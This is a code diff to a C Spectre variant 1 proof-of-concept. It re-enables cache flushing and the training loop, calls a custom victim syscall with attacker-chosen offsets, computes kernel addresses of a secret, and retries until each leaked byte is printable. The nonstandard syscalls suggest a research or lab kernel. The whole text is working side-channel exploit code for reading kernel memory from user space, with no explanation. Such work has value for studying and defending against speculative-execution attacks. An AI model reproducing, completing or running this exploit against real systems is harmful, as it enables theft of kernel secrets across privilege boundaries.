@@ -35,14 +35,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t m
     for (tries = 999; tries > 0; tries--) {
 
         /* Flush array2[256*(0..255)] from cache */
-        //for (i = 0; i < 256; i++)
-        //    _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+        for (i = 0; i < 256; i++)
+            _mm_clflush(&array2[i * 4096]); /* intrinsic for clflush instruction */
 
         /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
         training_x = tries % array1_size;
         for (j = 29; j >= 0; j--) {
-            //_mm_clflush(&array1_size);
-            //for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+            _mm_clflush(&array1_size);
+            for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 
             /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
             /* Avoid jumps in case those tip off the branch predictor */
@@ -52,7 +52,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t m
 
             /* Call the victim! */
             //victim_function(x);
-            //syscall(329, malicious_x, malicious_y);
+            syscall(329, malicious_x, malicious_y);
         }
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -106,7 +106,6 @@ int main(int argc, const char **argv) {
         perror("mmap operation failed");
         return -1;
     }
-    //printf("array2 = 0x%lx\n", (unsigned long)array2);
     
     kernel_array1 = syscall(330, 1);
     kernel_array2 = syscall(330, 2);
@@ -114,17 +113,23 @@ int main(int argc, const char **argv) {
     secret_kernel_vir = syscall(330, secret_physical_address);
 
 
-    //for (i = 0; i < MY_MMAP_LEN * PAGE_SIZE; i++) array2[i] = 'x'; // write to array2 so in RAM not copy-on-write zero pages
+    for (i = 0; i < 256 * 4096; i++) {
+        //printf("i = %d\n", i);
+	*(array2 + i) = 'x'; // write to array2 so in RAM not copy-on-write zero pages
+    }
     
     
     malicious_x = secret_kernel_vir - kernel_array1;
-    malicious_y = 0xffff8800758e0000 - kernel_array2;
+    malicious_y = 0xffff88000fd00000 - kernel_array2;
 
     printf("Reading %d bytes:\n", len);
     
     while (--len >= 0) {
         printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-        readMemoryByte(malicious_x++, value, score, malicious_y);
+	do {
+        	readMemoryByte(malicious_x, value, score, malicious_y);
+        } while (value[0] <= 31 || value[0] >= 127);
+        malicious_x++;
         printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
         printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
         if (score[1] > 0)
